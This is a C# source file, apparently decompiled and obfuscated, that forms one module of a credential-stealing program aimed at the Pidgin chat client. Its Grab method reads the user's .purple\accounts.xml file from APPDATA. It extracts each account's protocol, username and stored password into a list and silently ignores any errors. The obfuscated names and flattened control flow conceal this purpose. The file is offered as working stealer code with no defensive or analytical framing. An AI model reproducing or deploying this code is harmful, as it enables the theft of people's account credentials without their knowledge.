using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class oh6X2pxCojY : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string LaiJ3vStz
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public oh6X2pxCojY()
	{
		LaiJ3vStz = "Pidgin";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					string path = Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml";
					if (!File.Exists(path))
					{
						return new List<ii68>();
					}
					string text = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml");
					int count = Regex.Matches(text, Regex.Escape("<account>")).Count;
					for (int i = 0; i < count; i++)
					{
						string host = b4v.jCFtRv(text, "<protocol>", "</protocol>", i);
						string username = b4v.jCFtRv(text, "<name>", "</name>", i);
						string password = b4v.jCFtRv(text, "<password>", "</password>", i);
						list.Add(new ii68
						{
							byIdLuuGZbL = host,
							S8v = username,
							_9H5rP7hg2 = password,
							oVAe = LaiJ3vStz
						});
					}
				}
				catch
				{
				}
				return list;
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}
}
